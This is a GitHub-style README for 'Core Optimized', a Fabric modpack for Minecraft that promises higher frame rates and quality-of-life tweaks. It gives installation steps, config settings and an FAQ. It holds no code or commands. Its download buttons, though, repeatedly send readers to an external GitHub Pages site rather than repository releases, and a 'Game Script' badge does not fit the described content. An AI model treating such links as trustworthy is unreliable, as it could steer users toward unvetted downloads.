# Core Optimized – Performance Modpack for Minecraft

> **A vanilla-focused Minecraft modpack built on Fabric, designed to boost performance and enhance quality-of-life without disrupting the core gameplay experience.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/logan-ward1989/core-optimized-loader?style=flat-square)](https://github.com/logan-ward1989/core-optimized-loader)

---

<p align="center">
  <a href="https://logan-ward1989.github.io/core-optimized-loader/">
    <img src="https://img.shields.io/badge/Download-Core%20Optimized%20Modpack-brightgreen?style=for-the-badge" alt="Download Core Optimized Modpack">
  </a>
</p>

> **[Download Core Optimized Directly](https://logan-ward1989.github.io/core-optimized-loader/)**

---

[Download Latest Build](https://logan-ward1989.github.io/core-optimized-loader/)

---

## What It Does

Core Optimized is a handpicked collection of mods that improves Minecraft's performance while keeping the original vanilla feel intact. Running on Fabric, this pack delivers higher frame rates, fewer stutters, and faster chunk loading through proven optimization techniques. Every component was chosen to preserve the game's balance and visuals, making it ideal for players seeking better performance without extra content.

The pack also includes subtle quality-of-life tweaks that simplify everyday tasks like inventory management and world navigation. Built-in resource packs complement the vanilla style while further reducing GPU load. Regular updates maintain compatibility with the latest Minecraft releases and mod versions, ensuring a stable, up-to-date experience.

---

## Key Features

- **Performance Boost** – Higher FPS and reduced lag via optimized rendering, memory management, and chunk loading
- **Vanilla Integrity** – No new blocks, items, or dimensions; original mechanics and progression remain unchanged
- **Quality-of-Life Tweaks** – Inventory sorting, enhanced tooltips, minimap support, and customizable keybinds
- **Stability Improvements** – Crash fixes, memory leak prevention, and more reliable world loading
- **Optimized Resource Packs** – Lightweight textures and models that lower GPU usage while keeping the vanilla look
- **Fabric Framework** – Lightweight, fast mod loader compatible with the newest Minecraft versions
- **Open to Contributions** – Open-source project welcoming community input via Hacktoberfest and pull requests

---

## Installation

1. Download the latest modpack archive from the link above.
2. Install the Fabric mod loader for your Minecraft version.
3. Extract the modpack contents into your Minecraft `mods` folder.
4. Launch Minecraft using the Fabric profile.

Example directory layout:
```
.minecraft/
├── mods/
│   ├── coreoptimized-performance.jar
│   ├── coreoptimized-qol.jar
│   └── coreoptimized-resources.zip
└── resourcepacks/
    └── coreoptimized-textures.zip
```

---

## Configuration Options

| Setting | Default | Description |
|---------|---------|-------------|
| `enable_dynamic_lighting` | `true` | Toggle dynamic lighting from held items |
| `render_distance_boost` | `12` | Custom chunk render distance (4–32) |
| `smooth_fps_limit` | `144` | Frame rate cap (30–360) |
| `show_minimap` | `true` | Enable or disable the minimap overlay |
| `auto_sort_inventory` | `false` | Automatically sort inventory when opened |

Settings can be edited in the `config/coreoptimized.toml` file.

---

## Compatibility

This pack works with **Minecraft Java Edition** versions 1.20 and newer, using the **Fabric** mod loader. It is not compatible with Forge-based packs or OptiFine. Some mods may conflict with heavy content mods or world-editing tools. Performance improvements vary depending on your hardware and existing setup.

---

## Frequently Asked Questions

**How do I install the modpack?**  
Follow the installation steps above. Make sure you have the correct Fabric version for your Minecraft release.

**Will updates happen automatically?**  
No. You must manually download new releases. Watch the repository for update announcements.

**Can I add or remove mods?**  
Yes, the pack is modular. You can remove any mod, though performance may change as a result.

**Does this work on multiplayer servers?**  
The modpack is client-side. Most optimization mods work on servers, but some QoL features may require server-side mods.

**Where are configuration files stored?**  
All settings are in the `config/` folder inside your Minecraft directory.

---

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for full details.
